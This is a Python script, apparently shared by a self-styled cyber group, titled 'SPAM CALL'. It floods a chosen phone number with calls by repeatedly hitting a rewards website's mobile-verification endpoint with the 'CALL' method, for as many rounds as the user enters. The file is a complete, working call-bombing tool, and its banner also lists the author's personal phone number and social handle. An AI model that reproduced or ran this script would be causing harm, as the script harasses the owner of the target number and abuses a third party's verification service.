import os,sys,time,requests

banner= """\033[1;96m
   _______  ___   __  ___  ________   __   __
  / __/ _ \/ _ | /  |/  / / ___/ _ | / /  / /
 _\ \/ ___/ __ |/ /|_/ / / /__/ __ |/ /__/ /__
/___/_/  /_/ |_/_/  /_/  \___/_/ |_/____/____/v.1
\033[1;90m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;95mஜ۩۞۩ஜ\033[1;90m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 \033[1;90m[\033[1;96m•\033[1;90m] \033[1;93mAuthor    \033[1;91m: \033[1;92mKiyuzu
 \033[1;90m[\033[1;96m•\033[1;90m] \033[1;93mWA        \033[1;91m: \033[1;92m0895344415334
 \033[1;90m[\033[1;96m•\033[1;90m] \033[1;93mFacebook  \033[1;91m: \033[1;92mYg Baca Pacarku
 \033[1;90m[\033[1;96m•\033[1;90m] \033[1;93mCyber     \033[1;91m: \033[1;92mSquad Cyber Mafia
\033[1;90m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"""
os.system("clear")
print(banner)
print(" \033[1;90m[\033[1;96m~\033[1;90m] \033[1;95mExample \033[1:91m: \033[1;93m8********")
nomor = input(" \033[1;90m[\033[1;95m+\033[1;90m] \033[1;96mNumber Phone \033[1;90m~\033[1;95m•\033[1;96m> \033[1;92m")
jumlah = int(input(" \033[1;90m[\033[1;95m+\033[1;90m] \033[1;96mTotal Call \033[1;90m~\033[1;95m•\033[1;96m> \033[1;92m"))

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}

for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" \033[1;90m[\033[1;92m•\033[1;90m] \033[1;96mStatus \033[1;90m~\033[1;96m+\033[1;92m> \033[1;95m",(send.json()["message"]))

